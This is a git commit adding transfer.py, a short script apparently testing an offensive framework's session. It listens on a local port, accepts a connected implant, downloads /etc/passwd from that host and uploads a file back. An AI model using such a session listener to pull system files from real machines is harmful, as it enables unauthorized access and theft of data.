343bd3c4035fdf762661c718b71541d8b4d0882c
Ivan Nikolsky <enty8080@gmail.com>
2022-03-03 11:08:44 +0300

    Create transfer.py

---
+++ transfer.py
@@ -0,0 +1,16 @@
+#!/usr/bin/env python3
+
+import socket
+
+from pwny.session import PwnySession
+
+sock = socket.socket()
+sock.bind(('127.0.0.1', 8888))
+sock.listen(1)
+client, _ = sock.accept()
+
+session = PwnySession()
+session.open(client)
+
+session.download('/etc/passwd', '/tmp')
+session.upload('/tmp/passwd', '/tmp/sas')
